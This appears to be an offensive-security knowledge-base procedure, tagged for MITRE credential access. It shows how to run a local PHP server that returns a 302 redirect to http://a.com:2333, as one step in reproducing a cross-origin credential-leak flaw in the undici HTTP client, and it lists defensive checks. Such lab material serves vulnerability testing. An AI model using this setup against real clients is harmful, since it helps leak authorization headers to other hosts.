---
tags:
  - redirect-server
  - php
type: procedure
tools:
  - '[[tools/php]]'
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:29:09.550Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 9bfaa940-6df1-46f2-8435-02e4939c707a
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Setup-Redirect-Server

## Summary

This procedure sets up a local PHP-based redirect server to simulate a cross-origin redirect scenario for testing header handling in HTTP clients like undici.

## Description

In the context of demonstrating the undici vulnerability, a simple server on localhost issues a 302 redirect to http://a.com:2333. This allows control over the redirect flow without external dependencies. The server runs on port 80 and responds to GET requests with the redirect header, enabling the client to follow it automatically.

## Requirements

1. PHP installed on the local machine (version 7+)
2. Port 80 available (or adjust to another free port)
3. Local web server capability (e.g., built-in PHP server)

## Defense

Defensive measures and detection strategies:

- Monitor for unexpected 302 redirects in application logs
- Use web application firewalls to inspect redirect locations
- Validate redirect URIs against allowlists in client code

## Objectives

1. Establish a controlled redirect endpoint for vulnerability testing
2. Ensure cross-origin simulation by pointing to a mapped domain
3. Verify redirect issuance without additional headers

## Instructions

### Step 1: Create PHP Redirect Script

**Context**: Write a minimal PHP file that issues a 302 redirect to the target URL.

**Command** (create file):
```bash
cat > redirect.php << EOF
<?php header('Location: http://a.com:2333'); ?>
EOF
```

> This creates redirect.php with the header redirection. Expected output: File created successfully.

### Step 2: Start PHP Server

**Context**: Launch the built-in PHP server on localhost:80 to host the script.

**Command** (start server):
```bash
php -S 127.0.0.1:80 redirect.php
```

> Runs the server serving the redirect. Expected output: Server listening on http://127.0.0.1:80. Test with curl http://127.0.0.1/ to see 302 response.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Unsecured Credentials]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/php]]

## Tags

- redirect-server
- php
